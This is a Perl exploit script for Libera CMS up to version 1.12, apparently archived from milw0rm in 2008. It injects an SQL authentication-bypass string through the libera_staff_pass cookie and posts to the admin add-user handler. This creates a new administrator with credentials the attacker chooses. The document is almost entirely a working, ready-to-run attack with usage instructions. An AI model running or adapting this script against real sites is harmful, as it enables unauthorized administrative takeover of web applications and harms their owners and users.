<html><head><title>Libera CMS <= 1.12 (Cookie) Remote SQL Injection Exploit</title></head><pre>#!/usr/bin/perl
 # ----------------------------------------------------------
 # Libera CMS &lt;= 1.12 (Cookie) Remote SQL Injection Exploit
 # Perl Exploit - Add a new admin with your credentials!
 # Author: StAkeR - StAkeR[at]hotmail[dot]it
 # ----------------------------------------------------------
 # Usage: perl http://localhost/cms StAkeR obscure
 # ----------------------------------------------------------

 use strict;
 use LWP::UserAgent;

 my ($hostname,$username,$password) = @ARGV;
 my $request  = undef;
 my $http_s   = new LWP::UserAgent or die $!;

 $hostname = ($hostname =~ /^http:\/\/(.+?)$/) ? $ARGV[0] : banner();
 banner() unless $username and $password;

 $http_s-&gt;agent(&quot;Mozilla/4.5 [en] (Win95; U)&quot;);
 $http_s-&gt;timeout(1);
 $http_s-&gt;default_header('Cookie' =&gt; &quot;libera_staff_pass=' or '1=1&quot;);           

 $request = $http_s-&gt;post($hostname.&quot;/admin.php?action=add_user_process&quot;,
                         [
                          username       =&gt; $username,
                          password       =&gt; $password,
                          password_again =&gt; $password,
                          email          =&gt; 0,
                          su             =&gt; 1,
                          submit         =&gt; &quot;Add+User&quot;
                        ]);
        
 if($request-&gt;is_success)
 {
   if($request-&gt;content =~ /added successfully/i)
   {
     print &quot;[+] Exploit Done!\n&quot;;
     print &quot;[+] Added New Administrator:\n\n&quot;;
     print &quot;[+] Username: ${username}\n&quot;;
     print &quot;[+] Password: ${password}\n&quot;;
   }
   else
   {
     print &quot;[!] Exploit Failed!\n&quot;;
     print &quot;[!] Site Not Vulnerable\n&quot;;
   }
 }


 sub banner
 {
   print &quot;[+] Libera CMS &lt;= 1.2 Remote SQL Injection Exploit (add new admin)\n&quot;;
   print &quot;[+] Usage: perl exploit.pl [host] [username] [password]\n&quot;;
   print &quot;[+] Example: perl exploit.pl http://localhost/cms StAkeR obscure\n\n&quot;;
   return exit;
 }

# milw0rm.com [2008-09-10]</pre></html>